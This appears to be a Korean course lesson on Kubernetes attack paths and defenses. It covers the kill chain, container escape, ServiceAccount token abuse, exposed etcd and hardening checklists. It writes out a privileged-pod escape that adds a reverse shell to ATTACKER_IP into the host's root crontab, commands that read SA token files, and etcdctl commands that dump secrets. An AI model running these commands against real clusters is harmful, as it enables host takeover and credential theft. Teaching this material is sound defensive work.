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12: Kubernetes 공격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Kubernetes 환경의 주요 공격 벡터를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Pod 탈출(escape) 기법과 방어 방법을 익힌다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ServiceAccount 토큰 악용 시나리오를 파악한다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Kubernetes 공격 킬체인을 설명할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Kubernetes 공격 킬체인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초기 접근        → 취약한 웹 앱, 노출된 API 서버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실행             → Pod 내 명령 실행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권한 상승        → SA 토큰, privileged Pod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초기 접근        → 취약한 웹 앱, 노출된 API 서버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실행             → Pod 내 명령 실행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권한 상승        → SA 토큰, privileged Pod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4. 횡적 이동        → 다른 Pod/노드 접근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5. 데이터 수집      → Secret, ConfigMap 수집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6. 목표 달성        → 데이터 유출, 암호화폐 채굴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Pod 탈출 (Container Escape)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name: evil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name: host-root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name: host-root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공격자가 privileged Pod에 접근한 경우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호스트 파일시스템 마운트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mkdir /mnt/host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mount /dev/sda1 /mnt/host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호스트의 crontab에 리버스 셸 추가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"* * * * * /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1'"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&gt;&gt; /mnt/host/var/spool/cron/crontabs/root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ServiceAccount 토큰 악용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Pod 내부에서 SA 토큰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cat /var/run/secrets/kubernetes.io/serviceaccount/token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CA 인증서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cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt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네임스페이스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cat /var/run/secrets/kubernetes.io/serviceaccount/namespace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기타 공격 벡터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etcd가 노출된 경우 (포트 2379)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etcdctl get / --prefix --keys-only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etcdctl get /registry/secrets/default/db-credentials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방어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securityContext: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level: RequestResponse    # 모든 요청/응답 기록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group: ""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spec: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automountServiceAccountToken: false  # SA 토큰 마운트 금지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securityContext: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runAsNonRoot: true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runAsUser: 65534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containers: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- securityContext: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privileged: false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allowPrivilegeEscalation: false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readOnlyRootFilesystem: true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capabilities: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drop: ["ALL"]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실습: 공격 시나리오 이해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OpsClaw의 API 키 = K8s의 SA 토큰과 유사한 개념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API 키가 노출되면 전체 시스템 제어 가능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올바른 인증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-H "X-API-Key: opsclaw-api-key-2026"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http://localhost:8000/projects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인증 없이 시도 → 거부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http://localhost:8000/projects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공격 방어 체크리스트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privileged Pod가 없는가?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hostPath, hostNetwork, hostPID를 사용하지 않는가?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SA 토큰 자동 마운트를 비활성화했는가?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SA에 최소 권한만 부여했는가?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API Server에 인증이 설정되어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etcd가 외부에 노출되지 않는가?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공격 방어 체크리스트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Kubelet API에 인증이 설정되어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Dashboard가 외부에 노출되지 않는가?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감사 로깅이 활성화되어 있는가?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K8s 공격은 취약한 앱 → Pod 셸 → SA 토큰 → 횡적 이동 순으로 진행된다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privileged Pod와 hostPath는 컨테이너 탈출의 주요 경로이다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SA 토큰이 자동 마운트되므로, 불필요 시 반드시 비활성화한다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etcd, Kubelet API, Dashboard의 노출은 클러스터 전체 장악으로 이어진다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방어의 핵심은 최소 권한 + 네트워크 격리 + 감사 로깅이다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13: 클라우드 모니터링 - CloudTrail, CloudWatch 개념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13: 클라우드 모니터링 - CloudTrail, CloudWatch 개념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